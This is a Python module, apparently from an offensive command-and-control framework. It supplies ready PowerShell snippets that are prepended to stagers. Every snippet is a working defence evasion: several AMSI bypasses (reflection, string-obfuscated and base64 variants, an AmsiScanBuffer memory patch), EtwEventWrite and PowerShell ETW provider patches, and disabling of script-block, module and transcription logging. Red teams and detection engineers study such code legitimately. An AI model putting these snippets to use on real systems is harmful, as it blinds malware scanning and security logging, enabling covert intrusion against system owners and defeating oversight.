#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""In-process evasion snippets for PowerShell stagers / post modules.

Techniques inspired by common AMSI / ETW / logging evasion patterns
(e.g. reflection, obfuscation, AmsiScanBuffer memory patch).
"""

from __future__ import annotations

from typing import Dict, Optional

# Plain reflection — widely signatured; kept for compatibility / lab use
AMSI_INIT_FAILED_PS = (
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
)

# String split / -f format (RedTeam Recipes style)
AMSI_OBFUSCATED_PS = (
    "$w='System.Management.Automation.A';$c='si';$m='Utils';"
    "$t=[Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));"
    "$t.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static').SetValue($null,$true);"
)

# Unicode Base64 for AmsiUtils / amsiInitFailed type+field names
AMSI_BASE64_PS = (
    "[Ref].Assembly.GetType('System.Management.Automation.'+"
    "([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("
    "'QQBtAHMAaQBVAHQAaQBsAHMA'))))."
    "GetField(([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("
    "'YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static')"
    ".SetValue($null,$true);"
)

# Force AmsiContext to look uninitialized
AMSI_CONTEXT_PATCH_PS = (
    "$a=[Ref].Assembly.GetTypes();"
    "foreach($b in $a){if($b.Name -like '*iUtils'){$c=$b}};"
    "$d=$c.GetFields('NonPublic,Static');"
    "foreach($e in $d){if($e.Name -like '*Context'){"
    "$f=$e.GetValue($null);[IntPtr]$ptr=$f;[Int32[]]$buf=@(0);"
    "[Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)}};"
)

# Patch AmsiScanBuffer to return E_INVALIDARG (0x80070057) via double-add trampoline
AMSI_MEMORY_PATCH_PS = (
    "Add-Type @'\n"
    "using System;using System.Runtime.InteropServices;\n"
    "public class _KsAmsi{"
    "[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string n);"
    "[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string p);"
    "[DllImport(\"kernel32\")]public static extern bool VirtualProtect("
    "IntPtr a,UIntPtr s,uint n,out uint o);}\n"
    "'@;"
    "$dll=[Text.Encoding]::ASCII.GetString([byte[]](0x61,0x6d,0x73,0x69,0x2e,0x64,0x6c,0x6c));"
    "$fn=[Text.Encoding]::ASCII.GetString([byte[]]("
    "0x41,0x6d,0x73,0x69,0x53,0x63,0x61,0x6e,0x42,0x75,0x66,0x66,0x65,0x72));"
    "$h=[_KsAmsi]::LoadLibrary($dll);$a=[_KsAmsi]::GetProcAddress($h,$fn);$o=0;"
    "[_KsAmsi]::VirtualProtect($a,[UIntPtr]40,0x40,[ref]$o)|Out-Null;"
    "$p=[byte[]](0x31,0xC0,0x05,0x78,0x01,0x19,0x7F,0x05,0xDF,0xFE,0xED,0x00,0xC3);"
    "[Runtime.InteropServices.Marshal]::Copy($p,0,$a,$p.Length);"
)

# Cobbr-style ScriptBlockLogging GPO cache neuter (current process)
PS_SCRIPTBLOCK_CACHE_BYPASS_PS = (
    "$f=[Ref].Assembly.GetType('System.Management.Automation.Utils')"
    ".GetField('cachedGroupPolicySettings','NonPublic,Static');"
    "if($f){$c=$f.GetValue($null);"
    "if($c['ScriptBlockLogging']){"
    "$c['ScriptBlockLogging']['EnableScriptBlockLogging']=0;"
    "$c['ScriptBlockLogging']['EnableScriptBlockInvocationLogging']=0};"
    "$v=[Collections.Generic.Dictionary[string,object]]::new();"
    "$v.Add('EnableScriptBlockLogging',0);"
    "$v.Add('EnableScriptBlockInvocationLogging',0);"
    "$c['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\"
    "PowerShell\\ScriptBlockLogging']=$v};"
)

# Module logging GPO cache neuter
PS_MODULE_CACHE_BYPASS_PS = (
    "$f=[Ref].Assembly.GetType('System.Management.Automation.Utils')"
    ".GetField('cachedGroupPolicySettings','NonPublic,Static');"
    "if($f){$c=$f.GetValue($null);"
    "$v=[Collections.Generic.Dictionary[string,object]]::new();"
    "$v.Add('EnableModuleLogging',0);$v.Add('ModuleNames','');"
    "$c['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\"
    "PowerShell\\ModuleLogging']=$v};"
    "try{$m=Get-Module Microsoft.PowerShell.Utility -ErrorAction SilentlyContinue;"
    "if($m){$m.LogPipelineExecutionDetails=$false}}catch{};"
    "try{$s=Get-PSSnapin Microsoft.PowerShell.Core -ErrorAction SilentlyContinue;"
    "if($s){$s.LogPipelineExecutionDetails=$false}}catch{};"
)

# Transcription GPO cache neuter (must run before custom runspace for full effect)
PS_TRANSCRIPTION_CACHE_BYPASS_PS = (
    "$f=[Ref].Assembly.GetType('System.Management.Automation.Utils')"
    ".GetField('cachedGroupPolicySettings','NonPublic,Static');"
    "if($f){$c=$f.GetValue($null);"
    "$v=[Collections.Generic.Dictionary[string,object]]::new();"
    "$v.Add('EnableTranscripting',0);"
    "$c['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\"
    "PowerShell\\Transcription']=$v};"
)

# Disable PS ETW provider in-process (pairs with ScriptBlock bypass)
PS_ETW_PROVIDER_DISABLE_PS = (
    "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType("
    "'System.Diagnostics.Eventing.EventProvider')"
    ".GetField('m_enabled','NonPublic,Instance')"
    ".SetValue([Ref].Assembly.GetType("
    "'System.Management.Automation.Tracing.PSEtwLogProvider')"
    ".GetField('etwProvider','NonPublic,Static').GetValue($null),0);"
)

ETW_PATCH_PS = (
    "Add-Type @'\n"
    "using System;using System.Runtime.InteropServices;\n"
    "public class _KsEtw{[DllImport(\"kernel32\")]public static extern IntPtr GetModuleHandle(string n);"
    "[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string n);"
    "[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);}\n"
    "'@;"
    "$n=[_KsEtw]::GetModuleHandle('ntdll.dll');"
    "$e=[_KsEtw]::GetProcAddress($n,'EtwEventWrite');"
    "$o=0;[_KsEtw]::VirtualProtect($e,[UIntPtr]::new(1),0x40,[ref]$o)|Out-Null;"
    "[Runtime.InteropServices.Marshal]::WriteByte($e,0xC3);"
)

AMSI_VARIANTS: Dict[str, str] = {
    "amsi_init_failed": AMSI_INIT_FAILED_PS,
    "obfuscated": AMSI_OBFUSCATED_PS,
    "base64": AMSI_BASE64_PS,
    "context_patch": AMSI_CONTEXT_PATCH_PS,
    "memory_patch": AMSI_MEMORY_PATCH_PS,
}

# Variants that set amsiInitFailed=True (verifiable via reflection)
AMSI_INIT_FAILED_VARIANTS = frozenset({"amsi_init_failed", "obfuscated", "base64"})

DEFAULT_AMSI_VARIANT = "obfuscated"


def get_amsi_bypass(variant: Optional[str] = None) -> str:
    """Return a PowerShell AMSI bypass snippet for ``variant``."""
    name = (variant or DEFAULT_AMSI_VARIANT).strip().lower()
    return AMSI_VARIANTS.get(name) or AMSI_VARIANTS[DEFAULT_AMSI_VARIANT]


def powershell_prelude(
    *,
    bypass_amsi: bool = False,
    patch_etw: bool = False,
    amsi_variant: Optional[str] = None,
    bypass_scriptblock: bool = False,
) -> str:
    """Return PowerShell statements to prepend before stager body."""
    parts = []
    if bypass_amsi:
        parts.append(get_amsi_bypass(amsi_variant))
    if bypass_scriptblock:
        parts.append(PS_SCRIPTBLOCK_CACHE_BYPASS_PS)
        parts.append(PS_ETW_PROVIDER_DISABLE_PS)
    if patch_etw:
        parts.append(ETW_PATCH_PS)
    return "".join(parts)
